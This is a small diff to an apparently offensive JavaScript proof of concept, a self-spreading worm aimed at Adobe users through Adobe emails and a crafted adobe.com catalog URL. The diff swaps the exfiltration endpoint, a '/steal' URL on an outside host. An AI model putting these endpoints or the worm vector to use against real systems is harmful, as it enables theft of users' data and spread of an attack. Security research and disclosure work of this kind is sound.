@@ -10,7 +10,7 @@
  *          Victims click Adobe email → land on this page → repeat
  */
 
-const EXFIL    = 'https://klaltlv6.instances.httpworkbench.com/steal';
+const EXFIL    = 'https://w316qij2.instances.poc.jchunt.top/steal';
 const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=main--mas--rootd4ddy';
 const INV_HOST = 'https://invitations.adobe.io';
 const AB_HOST  = 'https://ab.adobe-identity.com';
